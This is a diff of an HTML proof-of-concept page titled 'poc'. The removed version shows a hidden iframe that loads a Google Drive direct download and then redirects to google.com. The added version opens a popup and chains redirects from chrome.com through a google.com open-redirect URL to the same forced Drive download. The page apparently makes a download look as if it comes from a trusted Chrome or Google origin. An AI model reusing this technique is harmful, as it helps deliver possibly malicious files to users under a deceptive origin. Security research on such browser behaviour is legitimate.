@@ -1,33 +1,29 @@
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<style>
-    h1 {
-        margin: 1em;
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>poc</title>
+  <script>
+    function chainRedirect(w, urls, index = 0) {
+      if (index < urls.length) {
+        w.location.replace(urls[index]);
+        setTimeout(() => chainRedirect(w, urls, index + 1), 1000);
+      }
     }
 
-    iframe {
-        display: none;
-        width: 100%;
-        height: 600px;
-        border: 0;
+    function startRedirect() {
+      let w = window.open("");
+      setTimeout(() => {
+        chainRedirect(w, [
+        "https://chrome.com",
+        "https://www.google.com/url?q=https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=c0a9d415-1a26-40f4-aa23-d51ca3b3b3ff&at=AGN2oQ0ghVf6FdtYpzCBjaGhXUYa:1773898386994",
+        "https://www.google.com/url?q=https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=c0a9d415-1a26-40f4-aa23-d51ca3b3b3ff&at=AGN2oQ0ghVf6FdtYpzCBjaGhXUYa:1773898386994",
+        ]);
+      }, 1000);
     }
-</style>
-
-
-<iframe 
-  src="https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=2fd86e2c-3607-49fa-9e91-ac198eae5e46&at=AGN2oQ1rJLXpYieZleCfJPt2IM4z:1773900320983"
-  width="100%" 
-  height="600" 
-  allow="autoplay">
-</iframe>
-<script>
-    // Tampilkan iframe setelah 2 detik
-    setTimeout(() => {
-        document.getElementById("frame").style.display = "block";
-    }, 3500);
-
-    // Redirect ke Google setelah 4 detik
-    setTimeout(() => {
-        window.location.href = "https://google.com";
-    }, 5000);
-</script>
+  </script>
+</head>
+<body>
+  <button onclick="startRedirect()">Start</button>
+</body>
+</html>
